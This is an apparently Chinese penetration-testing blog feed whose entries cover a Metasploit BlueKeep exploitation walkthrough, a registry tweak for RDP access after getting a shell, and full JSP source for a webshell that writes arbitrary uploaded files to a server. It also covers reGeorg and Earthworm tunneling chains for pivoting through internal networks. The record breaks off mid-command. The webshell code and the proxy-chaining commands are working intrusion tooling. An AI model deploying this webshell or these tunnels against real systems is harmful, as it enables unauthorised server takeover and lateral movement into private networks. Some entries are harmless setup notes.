      <title>CVE-2019-0708-远程桌面RCE漏洞</title>
      <link href="/2019/09/07/CVE-2019-0708-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/09/07/CVE-2019-0708-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h2><p>2019年5月微软更新了一个存在于Windows远程桌面服务严重的RCE漏洞，该漏洞可远程无交互执行任意命令，直接控制目标系统，该漏洞被命名为<code>BlueKeep</code>。</p><p>2019年9月7日<strong>Metasploit</strong>释放了针对<code>BlueKeep</code>的漏洞利用模块，这样该漏洞就开始可以大众化的进行攻击利用了。</p><p>本篇文章讲述了如何对此次新放出的漏洞利用程序进行模拟攻击测试。</p><p><strong>注意：以下内容仅供学习参考和技术交流，禁止在非授权的情况下进行违规测试。</strong></p><h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><ul><li>Windows 7</li><li>Windows Server 2008 R2</li><li>Windows Server 2008</li><li>Windows 2003</li><li>Windows XP</li></ul><h2 id="二、漏洞扫描"><a href="#二、漏洞扫描" class="headerlink" title="二、漏洞扫描"></a>二、漏洞扫描</h2><p>2019年5月份，各大厂商均发布相关的漏洞测试和修复工具，帮助政府和企业进行自查，避免受到该漏洞的影响。</p><h2 id="三、环境准备"><a href="#三、环境准备" class="headerlink" title="三、环境准备"></a>三、环境准备</h2><p><strong>测试环境</strong><br>攻击机:</p><ul><li>kali2019.2</li></ul><p>靶机： </p><ul><li>win7 sp1 7061</li></ul><p><strong>更换默认源</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">#清华源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">apt update</span><br></pre></td></tr></table></figure><p><strong>更新MSF</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#更新</span><br><span class="line">apt install metasploit-framework</span><br><span class="line">#安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/</span><br><span class="line">chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">./msfinstall</span><br></pre></td></tr></table></figure><p><strong>替换文件</strong></p><p>因为是非正式更新，需要自行手动下载文件到指定目录（前提先需要对msf进行更新）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/msf_update_0708 &amp;&amp; cd /opt/msf_update_0708</span><br><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line">cp rdp.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure><h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">reload_all #重新加载所有模块</span><br><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">info#查看模块信息</span><br><span class="line">set rhosts 192.168.119.133</span><br><span class="line">set rport 3389</span><br><span class="line">set target 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/CVE-2019-0708远程桌面代码执行漏洞复现/1567840461013.png" alt="1567840461013"></p><p>第一次执行，提示未发现漏洞</p><p><img src="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/CVE-2019-0708远程桌面代码执行漏洞复现/1567839868600.png" alt="1567839868600"></p><p>因为没有选择允许任意远程桌面连接</p><p><img src="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/CVE-2019-0708远程桌面代码执行漏洞复现/1567839994519.png" alt="1567839994519"></p><p>修改后继续执行exp</p><p><img src="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/CVE-2019-0708远程桌面代码执行漏洞复现/1567840091553.png" alt="1567840091553"></p><p>目标机蓝屏</p><p><img src="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/CVE-2019-0708远程桌面代码执行漏洞复现/1567839800637.png" alt="1567839800637"></p><p>因为目标系统版本不匹配，修改target Id 3（本测试环境为VMWare下的Win7虚拟机）</p><p><img src="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/CVE-2019-0708远程桌面代码执行漏洞复现/1567840553914.png" alt="1567840553914"></p><p>很快就获得了session，并且权限为system</p><p><img src="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/CVE-2019-0708远程桌面代码执行漏洞复现/1567840303155.png" alt="1567840303155"></p><h2 id="五、漏洞修复"><a href="#五、漏洞修复" class="headerlink" title="五、漏洞修复"></a>五、漏洞修复</h2><p><strong>手动防护：</strong></p><p>1．禁用远程桌面服务。</p><p>2．在防火墙处阻止远程桌面端口(默认为3389)。</p><p>3．启用网络级别身份验证（NLA），此操作适用于Windows 7，Windows Server 2008和Windows Server 2008 R2版本的系统上。</p><p><strong>打补丁：</strong></p><p>360在线、离线修复工具：<a href="http://weishi.360.cn/mianyigongju.html" target="_blank" rel="noopener">http://weishi.360.cn/mianyigongju.html</a></p><p>360热补丁工具：<a href="http://down.360safe.com/HotFix_CVE-2019-0708.exe" target="_blank" rel="noopener">http://down.360safe.com/HotFix_CVE-2019-0708.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10远程连接报错</title>
      <link href="/2019/08/05/Windows10%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%8A%A5%E9%94%99/"/>
      <url>/2019/08/05/Windows10%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<p><strong>由于CredSSP加密Oracle修正</strong></p><p>拿到 shell，将 3389 端口转发出来之后，尝试连接发现出现问题，估计是限制了我这边的 IP 访问。</p><p><strong>解决方法：</strong></p><p>添加注册表 <code>AllowEncryptionOracle</code> 项即可。</p><p>一条命令直接解决（需要在 system32 目录下的 cmd 中执行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f</span><br></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/lindajia/p/9021082.html" target="_blank" rel="noopener">Windows10远程报错:由于CredSSP加密Oracle修正</a></p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql指定版本安装</title>
      <link href="/2019/08/05/mysql%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85/"/>
      <url>/2019/08/05/mysql%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="安装mysql8（或指定版本）"><a href="#安装mysql8（或指定版本）" class="headerlink" title="安装mysql8（或指定版本）"></a>安装mysql8（或指定版本）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb </span><br><span class="line">sudo dpkg -i mysql-apt-config_0.8.12-1_all.deb</span><br><span class="line">#select version 8.0</span><br><span class="line">sudo apt update </span><br><span class="line">sudo apt install mysql-server</span><br><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shadowsocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell升级</title>
      <link href="/2019/08/05/powershell%E5%8D%87%E7%BA%A7/"/>
      <url>/2019/08/05/powershell%E5%8D%87%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="powershell升级"><a href="#powershell升级" class="headerlink" title="powershell升级"></a>powershell升级</h1><p><a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-windows-powershell?view=powershell-6" target="_blank" rel="noopener">微软下载地址</a></p><p>先安装dotNetFx45，再安装Windows6.1-KB2819745-x64-MultiPkg，最后重启就可以了</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制文件上传(JSP)</title>
      <link href="/2019/08/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(JSP)/"/>
      <url>/2019/08/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(JSP)/</url>
      
        <content type="html"><![CDATA[<h2 id="jsp利用base64解码上传二进制文件"><a href="#jsp利用base64解码上传二进制文件" class="headerlink" title="jsp利用base64解码上传二进制文件"></a>jsp利用base64解码上传二进制文件</h2><p>当我们在有新建文本文件权限，但被限制上传、不能远程下载文件时，可以试试此方式</p><p>shell:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> pageEncoding=<span class="string">"UTF-8"</span> contentType=<span class="string">"text/html; charset=utf-8"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">        String filePath = request.getParameter(<span class="string">"filePath"</span>);</span><br><span class="line">        String content = request.getParameter(<span class="string">"content"</span>);</span><br><span class="line">        String base64Flag = request.getParameter(<span class="string">"base64"</span>);</span><br><span class="line">        String msg = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(content != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        File file = <span class="keyword">new</span> File(filePath);</span><br><span class="line">                        OutputStream os = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">                        <span class="keyword">byte</span>[] bytes = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="string">"on"</span>.equals(base64Flag))&#123;</span><br><span class="line">                                bytes = <span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(content);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                bytes = content.getBytes(<span class="string">"utf-8"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        os.write(bytes);</span><br><span class="line">                        os.close();</span><br><span class="line">                        msg = <span class="string">"success"</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                        msg = <span class="string">"error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">                &lt;font color="red"&gt;&lt;%=msg%&gt;&lt;/font&gt;</span><br><span class="line">                &lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                        &lt;table&gt;</span><br><span class="line">                                &lt;tr&gt;</span><br><span class="line">                                        &lt;td&gt;本文件路径：&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;%=application.getRealPath("")%&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr&gt;</span><br><span class="line">                                        &lt;td&gt;保存路径：&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;input type="text" size="60" name="filePath"/&gt;&lt;input type="checkbox" name="base64"/&gt;base64解码保存&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr valign=<span class="string">"top"</span>&gt;</span><br><span class="line">                                        &lt;td&gt;大马内容:&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;textarea rows="20" cols="70" name="content"&gt;&lt;/textarea&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr align=<span class="string">"right"</span>&gt;</span><br><span class="line">                                        &lt;td&gt; &lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;input type="submit" value="保存"/&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                        &lt;/table&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>编码工具</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Base64File</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(args.length != <span class="number">1</span>)&#123;</span><br><span class="line">                        System.out.println(<span class="string">"usage:Base64File filename"</span>);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(getStr(args[<span class="number">0</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getStr</span><span class="params">(String filename)</span> </span>&#123;</span><br><span class="line">                InputStream in = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] data = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                        in = <span class="keyword">new</span> FileInputStream(filename);</span><br><span class="line">                        data = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">                        in.read(data);</span><br><span class="line">                        in.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                BASE64Encoder encoder = <span class="keyword">new</span> BASE64Encoder();</span><br><span class="line">                <span class="keyword">return</span> encoder.encode(data);<span class="comment">// 返回Base64编码过的字节数组字符串</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决cmd和pip报错</title>
      <link href="/2019/08/05/%E8%A7%A3%E5%86%B3cmd%E5%92%8Cpip%E6%8A%A5%E9%94%99/"/>
      <url>/2019/08/05/%E8%A7%A3%E5%86%B3cmd%E5%92%8Cpip%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<p>chcp65001报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 1252</span><br></pre></td></tr></table></figure><p>解决烦人的Windows下的python2&amp;3使用pip安装模块报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#pip pip2 pip3报错</span><br><span class="line">python2 -m pip install --upgrade pip</span><br><span class="line">python2 -m pip install --upgrade pip</span><br><span class="line">python2/3 -m pip install pack_name</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动(代理转发)</title>
      <link href="/2019/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91)/"/>
      <url>/2019/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91)/</url>
      
        <content type="html"><![CDATA[<h1 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h1><h2 id="内网代理分类："><a href="#内网代理分类：" class="headerlink" title="内网代理分类："></a>内网代理分类：</h2><p>正向代理：lhost→代理工具→rhost（攻击者主动连接，需要远程服务器开启端口，可能被防火墙检测到）</p><p>反向代理：rhost→代理工具→firewall→lhost(攻击者主机开启端口监听，远程主机主动过来连接)</p><p>采用Reverse的方法较为安全，采用bind方式容易被发现</p><h2 id="Web代理"><a href="#Web代理" class="headerlink" title="Web代理"></a>Web代理</h2><h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><p>php版本 &lt;= 5.4</p><h4 id="reGeorg-Proxifier"><a href="#reGeorg-Proxifier" class="headerlink" title="reGeorg + Proxifier"></a>reGeorg + Proxifier</h4><p>reGeorg基于Socks5代理，一般需要和Proxifier配套使用，整个过程也是使用HTTP协议传输，操作较为复杂。</p><p>使用的Proxifier工具保证其底层数据建立连接的过程中使用socket通信（ping、icmp、网络层）</p><p>上传<code>tunnel.php</code>或者<code>tunnel.nosocket.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -p 9999 -u http://192.168.10.15/tunnel.nosocket.php</span><br></pre></td></tr></table></figure><h4 id="reGeorg-sockscap64"><a href="#reGeorg-sockscap64" class="headerlink" title="reGeorg + sockscap64"></a>reGeorg + sockscap64</h4><h4 id="reGeorg-proxychains-Linux"><a href="#reGeorg-proxychains-Linux" class="headerlink" title="reGeorg + proxychains(Linux)"></a>reGeorg + proxychains(Linux)</h4><p>修改配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks5 127.0.0.1 9999</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap 192.168.6.0/24</span><br></pre></td></tr></table></figure><h3 id="冰蝎代理-sockscap64"><a href="#冰蝎代理-sockscap64" class="headerlink" title="冰蝎代理 + sockscap64"></a>冰蝎代理 + sockscap64</h3><h3 id="菜刀连内网数据库"><a href="#菜刀连内网数据库" class="headerlink" title="菜刀连内网数据库"></a>菜刀连内网数据库</h3><h3 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h3><p>轻量级内网穿透工具，基于C，Readme介绍的很详细</p><p>三大功能：socks5代理，端口转发，端口映射</p><p>nmap扫描加-Pn不检测主机存活，-sT识别更准确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-s 指定链路状态，6种：ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran</span><br><span class="line">-l 本地监听的端口</span><br><span class="line">-d 指定转发或者反弹的主机地址</span><br><span class="line">-e 指定转发或者反弹的主机端口</span><br><span class="line">-f 连接或者映射的主机地址</span><br><span class="line">-g 连接或者映射的主机端口</span><br></pre></td></tr></table></figure><blockquote><p>6种链路状态：</p><p>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。<br>其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。</p></blockquote><p><strong>正向socks5代理</strong></p><p>目标网络边界存在公网IP且可任意开监听端口</p><pre><code>+---------+     +-------------------+  |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1  |+---------+     +-------------------+./ew -s ssocksd -l 1080                    #建立socks5服务器</code></pre><p><strong>反向socks5代理</strong></p><p>适用于目标无公网IP，但可访问互联网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">         一台可控公网IP主机                    可控内网主机                    </span><br><span class="line">+---------+     +--------------------------+    |     +---------------+</span><br><span class="line">|HackTools| -&gt;&gt; | 1080 -&gt; 0.0.0.0 -&gt; 55545 |  防火墙   | &lt;--  1.1.1.1  |</span><br><span class="line">+---------+     +--------------------------+    |     +---------------+</span><br><span class="line"></span><br><span class="line">./ew -s rcsocks -l 1080 -e 55545 #VPS监听</span><br><span class="line">./ew -s rssocks -d 1.1.1.1 -e 55545 #socks5服务器主动连接</span><br></pre></td></tr></table></figure><p>端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 55545#0.0.0.0</span><br><span class="line">./ew -s lcx_slave -d 0.0.0.0 -e 55545 -f 1.1.1.1 -g 55545#0.0.0.0，1.1.1.1</span><br><span class="line">./ew -s lcx_tran -l 55545 -f 2.2.2.2 -g 3389#1.1.1.1，2.2.2.2</span><br></pre></td></tr></table></figure><p>0.0.0.0为vps，1.1.1.1为内网1，2.2.2.2为内网2</p><blockquote><p>lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。<br>lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。<br>lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</p><p>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。</p></blockquote><p><strong>二级级联（一层代理）</strong></p><p>边界可开端口（正向代理），二层网络不用开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">可控边界主机A             可访问指定资源的主机B</span><br><span class="line">+---------+     +-----------------------+      +-----------------+</span><br><span class="line">|HackTools| -&gt;&gt; | 1080 --&gt; 1.1.1.1  --&gt; | -&gt;&gt;  |  80 -&gt; 2.2.2.2  |</span><br><span class="line">+---------+     +-----------------------+      +-----------------+</span><br><span class="line"></span><br><span class="line">./ew -s ssocksd  -l 80#1.1.1.1，2.2.2.2</span><br><span class="line">./ew -s lcx_tran -l 1080 -f 1.1.1.1 -g 80#1.1.1.1，0.0.0.0</span><br><span class="line">HackTools可通过访问0.0.0.0:1080来使用B主机提供的socks5代理。 #0.0.0.0</span><br></pre></td></tr></table></figure><p><strong>二级级联（一层代理）</strong></p><p>边界不可开端口（反向代理），二层网络开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     一台可控公网IP主机              可控内网主机A         可访问指定资源的主机B</span><br><span class="line">+---------+     +----------------------+   |   +---------------+     +----------------+</span><br><span class="line">|HackTools| -&gt;&gt; | 1080-&gt;0.0.0.0-&gt;55545 | 防火墙 | &lt;--1.1.1.1--&gt; | -&gt;&gt; | 55545-&gt;2.2.2.2 |</span><br><span class="line">+---------+     +----------------------+   |   +---------------+     +----------------+</span><br><span class="line"></span><br><span class="line">./ew -s lcx_listen -l 1080 -e 55545#0.0.0.0</span><br><span class="line">./ew -s lcx_slave -d 0.0.0.0 -e 55545 -f 1.1.1.1 -g 55545#0.0.0.0，1.1.1.1</span><br><span class="line">./ew -s ssocksd -l 55545#1.1.1.1，2.2.2.2</span><br></pre></td></tr></table></figure><p><strong>三级级联（两层代理）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 55545#0.0.0.0</span><br><span class="line">./ew -s lcx_slave -d 0.0.0.0 -e 55545 -f 1.1.1.1 -g 55545#0.0.0.0，1.1.1.1</span><br><span class="line">./ew -s lcx_listen -l 55545 -e 55544#1.1.1.1，2.2.2.2</span><br><span class="line">./ew -s 